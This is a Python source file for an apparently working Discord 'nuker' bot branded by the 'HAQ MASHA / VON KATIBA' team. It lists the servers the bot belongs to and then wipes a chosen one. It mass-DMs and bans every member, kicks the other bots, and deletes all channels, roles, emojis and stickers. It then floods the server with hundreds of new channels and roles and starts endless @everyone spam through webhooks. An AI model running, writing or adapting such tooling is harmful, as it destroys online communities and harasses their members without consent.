import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp
import json

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗  ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗ ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║ ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║ ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║ ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
║                                                                               ║
║                         HAQ MASHA VON KATIBA NUKER                            ║
║                         SELECT TARGET SERVER v9.0                             ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN > ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

# ============================================
# MESSAGES
# ============================================
HAQ_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
║                                                                               ║
║                    ██████╗ ███╗   ██╗    ██╗   ██╗ ██████╗ ███╗   ██╗        ║
║                    ██╔══██╗████╗  ██║    ██║   ██║██╔═══██╗████╗  ██║        ║
║                    ██████╔╝██╔██╗ ██║    ██║   ██║██║   ██║██╔██╗ ██║        ║
║                    ██╔══██╗██║╚██╗██║    ╚██╗ ██╔╝██║   ██║██║╚██╗██║        ║
║                    ██████╔╝██║ ╚████║     ╚████╔╝ ╚██████╔╝██║ ╚████║        ║
║                    ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝        ║
║                                                                               ║
║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
║                                                                               ║
║                    YOU HAVE BEEN TERMINATED BY                                ║
║                    HAQ MASHA & VON KATIBA TEAM                                ║
║                                                                               ║
║                    https://discord.gg/c7cgYk4V                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

SPAM_LIST = [
    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
    "**الكتيبة هاق مشا تيم - VON KATIBA**",
    "@everyone **YOUR SERVER IS GONE FOREVER**",
    "```VON KATIBA WAS HERE```",
    "**HAQ MASHA TEAM - VON KATIBA EDITION**",
    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "```YOU HAVE BEEN VON KATIBA'ED```",
    "@everyone **HAQ MASHA KILLED THIS SERVER**",
    "```BYE BYE SERVER```"
]

ROLE_NAMES = ["VON", "KATIBA", "HAQ", "MASHA", "NUKE", "DESTROYER", "DEATH", "TERMINATED", "LMOT", "RA7", "TARJ3", "LOT", "HHHH"]

WEBHOOK_NAMES = ["VON-KATIBA", "HAQ-MASHA", "NUKER", "DESTROYER", "SYSTEM"]

# ============================================
# SHOW SERVERS FUNCTION
# ============================================
async def show_servers(ctx):
    guilds = bot.guilds
    if not guilds:
        await ctx.send("❌ **NO SERVERS FOUND! BOT IS NOT IN ANY SERVER**")
        return None
    
    server_list = "```\n"
    server_list += "╔══════════════════════════════════════════════════════════════════╗\n"
    server_list += "║                    AVAILABLE SERVERS TO NUKE                     ║\n"
    server_list += "╠══════════════════════════════════════════════════════════════════╣\n"
    
    for i, guild in enumerate(guilds, 1):
        member_count = len(guild.members)
        server_list += f"║  [{i}] {guild.name[:40]:<40} | Members: {member_count:<5} ║\n"
    
    server_list += "╚══════════════════════════════════════════════════════════════════╝\n"
    server_list += "```"
    
    await ctx.send(server_list)
    
    return guilds

# ============================================
# MAIN NUKE FUNCTION
# ============================================
async def max_nuke(guild, ctx_channel):
    start_time = time.time()
    
    await ctx_channel.send(f"```🔥 HAQ MASHA + VON KATIBA NUKE INITIATED ON: {guild.name} 🔥```")
    print(f"\n[!] VON KATIBA NUKE STARTED ON: {guild.name} | ID: {guild.id}")
    
    # ============================================
    # PHASE 1: CREATE AND SAVE WEBHOOKS
    # ============================================
    await ctx_channel.send("**🪝 PHASE 1: CREATING 100 WEBHOOKS**")
    
    webhooks = []
    text_channels = [ch for ch in guild.text_channels]
    
    for ch in text_channels[:20]:
        for i in range(5):
            try:
                webhook = await ch.create_webhook(name=random.choice(WEBHOOK_NAMES))
                webhooks.append(webhook)
                await asyncio.sleep(0.05)
            except:
                pass
    
    await ctx_channel.send(f"**✅ CREATED {len(webhooks)} WEBHOOKS**")
    
    # ============================================
    # PHASE 2: TORTURE ALL MEMBERS
    # ============================================
    await ctx_channel.send("**🔪 PHASE 2: TORTURING ALL MEMBERS**")
    
    members = await guild.fetch_members(limit=None).flatten()
    total_humans = len([m for m in members if not m.bot])
    tortured = 0
    
    for member in members:
        if not member.bot:
            try:
                for _ in range(3):
                    await member.send(HAQ_MESSAGE)
                    await asyncio.sleep(0.1)
                tortured += 1
                if tortured % 5 == 0:
                    await ctx_channel.send(f"**TORTURED {tortured}/{total_humans} MEMBERS**")
                await asyncio.sleep(0.05)
            except:
                pass
    
    await ctx_channel.send(f"**✅ TORTURED {tortured} MEMBERS**")
    
    # ============================================
    # PHASE 3: BAN ALL MEMBERS
    # ============================================
    await ctx_channel.send("**🔨 PHASE 3: BANNING ALL MEMBERS**")
    
    banned = 0
    for member in members:
        if not member.bot:
            try:
                await member.ban(reason="VON KATIBA HAQ MASHA", delete_message_days=7)
                banned += 1
                if banned % 10 == 0:
                    await ctx_channel.send(f"**BANNED {banned}/{total_humans} MEMBERS**")
                await asyncio.sleep(0.03)
            except:
                pass
    
    await ctx_channel.send(f"**✅ BANNED {banned} MEMBERS**")
    
    # ============================================
    # PHASE 4: REMOVE ALL BOTS
    # ============================================
    await ctx_channel.send("**🤖 PHASE 4: REMOVING ALL BOTS**")
    
    bots_kicked = 0
    for member in members:
        if member.bot and member.id != bot.user.id:
            try:
                await member.kick(reason="HAQ MASHA")
                bots_kicked += 1
                await asyncio.sleep(0.03)
            except:
                pass
    
    await ctx_channel.send(f"**✅ REMOVED {bots_kicked} BOTS**")
    
    # ============================================
    # PHASE 5: DELETE ALL CHANNELS
    # ============================================
    await ctx_channel.send("**🗑️ PHASE 5: DELETING ALL CHANNELS**")
    
    channels_deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete(reason="VON KATIBA")
            channels_deleted += 1
            await asyncio.sleep(0.02)
        except:
            pass
    
    await ctx_channel.send(f"**✅ DELETED {channels_deleted} CHANNELS**")
    
    # ============================================
    # PHASE 6: DELETE ALL ROLES
    # ============================================
    await ctx_channel.send("**🎭 PHASE 6: DELETING ALL ROLES**")
    
    roles_deleted = 0
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="VON KATIBA")
                roles_deleted += 1
                await asyncio.sleep(0.02)
            except:
                pass
    
    await ctx_channel.send(f"**✅ DELETED {roles_deleted} ROLES**")
    
    # ============================================
    # PHASE 7: DELETE ALL EMOJIS & STICKERS
    # ============================================
    await ctx_channel.send("**😀 PHASE 7: DELETING EMOJIS & STICKERS**")
    
    emojis_deleted = 0
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            emojis_deleted += 1
            await asyncio.sleep(0.02)
        except:
            pass
    
    stickers_deleted = 0
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            stickers_deleted += 1
            await asyncio.sleep(0.02)
        except:
            pass
    
    await ctx_channel.send(f"**✅ DELETED {emojis_deleted} EMOJIS & {stickers_deleted} STICKERS**")
    
    # ============================================
    # PHASE 8: CHANGE SERVER NAME
    # ============================================
    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "DESTROYED", "VON-HAQ", "KATIBA-MASHA", "LMOT", "RA7 TARJ3 LOT"])
    try:
        await guild.edit(name=new_name)
        await ctx_channel.send(f"**✅ SERVER RENAMED TO: {new_name}**")
    except:
        pass
    
    # ============================================
    # PHASE 9: CREATE MASS CHANNELS (400)
    # ============================================
    await ctx_channel.send("**📁 PHASE 9: CREATING 400 CHANNELS**")
    
    for i in range(400):
        try:
            channel_type = random.choice(["text", "voice"])
            if channel_type == "text":
                await guild.create_text_channel(name=f"von-katiba-{i}")
            else:
                await guild.create_voice_channel(name=f"von-katiba-{i}")
            
            if i % 50 == 0:
                await ctx_channel.send(f"**CREATED {i} CHANNELS...**")
            await asyncio.sleep(0.01)
        except:
            pass
    
    # ============================================
    # PHASE 10: CREATE MASS ROLES (150)
    # ============================================
    await ctx_channel.send("**🎭 PHASE 10: CREATING 150 ROLES**")
    
    for i in range(150):
        try:
            await guild.create_role(name=f"{random.choice(ROLE_NAMES)}-{i}", color=discord.Color.red())
            if i % 30 == 0:
                await ctx_channel.send(f"**CREATED {i} ROLES...**")
            await asyncio.sleep(0.01)
        except:
            pass
    
    # ============================================
    # PHASE 11: INFINITE SPAM (WEBHOOKS + CHANNELS)
    # ============================================
    await ctx_channel.send("**💬 PHASE 11: STARTING INFINITE SPAM**")
    
    async def webhook_spam():
        while True:
            for webhook in webhooks:
                try:
                    await webhook.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.03)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    async def channel_spam():
        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.03)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(webhook_spam())
    asyncio.create_task(channel_spam())
    
    # ============================================
    # PHASE 12: FINAL MESSAGE
    # ============================================
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    final_msg = f"""```diff
+ ╔═══════════════════════════════════════════════════════════════════════════════╗
+ ║                                                                               ║
+ ║                    SERVER DESTROYED BY HAQ MASHA & VON KATIBA                 ║
+ ║                                                                               ║
+ ║                    TARGET: {guild.name[:30]}                                  ║
+ ║                                                                               ║
+ ║                    STATISTICS:                                                ║
+ ║                    • TORTURED: {tortured} MEMBERS                             ║
+ ║                    • BANNED: {banned} MEMBERS                                 ║
+ ║                    • BOTS REMOVED: {bots_kicked}                              ║
+ ║                    • CHANNELS DELETED: {channels_deleted}                     ║
+ ║                    • ROLES DELETED: {roles_deleted}                           ║
+ ║                    • WEBHOOKS CREATED: {len(webhooks)}                        ║
+ ║                    • TIME: {total_time} SECONDS                               ║
+ ║                                                                               ║
+ ║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
+ ║                                                                               ║
+ ║                    HAQ MASHA TEAM - ALGERIA                                   ║
+ ║                                                                               ║
+ ║                    https://discord.gg/c7cgYk4V                                ║
+ ║                                                                               ║
+ ╚═══════════════════════════════════════════════════════════════════════════════╝
```"""
    
    for channel in guild.text_channels:
        try:
            await channel.send(final_msg)
            break
        except:
            pass
    
    print(f"[✓] VON KATIBA NUKE COMPLETED ON: {guild.name} | TIME: {total_time}s")

# ============================================
# SELECTION SYSTEM
# ============================================
selected_server = None

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ✓ BOT ONLINE: {bot.user.name}
║              ✓ BOT ID: {bot.user.id}
║              ✓ SERVERS: {len(bot.guilds)}
║                                                                               ║
║              THE BOT IS READY!                                                ║
║              YOU CAN NOW SELECT A SERVER TO NUKE                              ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    # Auto show servers in console
    print("\n" + "="*60)
    print("AVAILABLE SERVERS:")
    print("="*60)
    for i, guild in enumerate(bot.guilds, 1):
        print(f"  [{i}] {guild.name} | Members: {len(guild.members)} | ID: {guild.id}")
    print("="*60)

@bot.event
async def on_message(message):
    global selected_server
    
    if message.author == bot.user:
        return
    
    # If we're in selection mode
    if selected_server is None:
        # Show server list
        if message.content.lower() == 'v':
            guilds = await show_servers(message)
            if guilds:
                await message.channel.send("```\n📌 TYPE THE SERVER NUMBER (1-{}) TO START THE NUKE\n```".format(len(guilds)))
                
                def check(m):
                    return m.author == message.author and m.channel == message.channel and m.content.isdigit()
                
                try:
                    response = await bot.wait_for('message', timeout=30.0, check=check)
                    choice = int(response.content)
                    
                    if 1 <= choice <= len(guilds):
                        selected_server = guilds[choice - 1]
                        await message.channel.send(f"```✅ SELECTED: {selected_server.name}\n🔥 STARTING NUKE IN 3 SECONDS...```")
                        await asyncio.sleep(3)
                        await max_nuke(selected_server, message.channel)
                        selected_server = None
                    else:
                        await message.channel.send("❌ **INVALID NUMBER! TYPE 'v' AGAIN TO TRY**")
                        selected_server = None
                except asyncio.TimeoutError:
                    await message.channel.send("⏰ **TIMEOUT! TYPE 'v' AGAIN TO START OVER**")
                    selected_server = None
        
    await bot.process_commands(message)

# ============================================
# RUN THE BOT
# ============================================
bot.run(TOKEN)
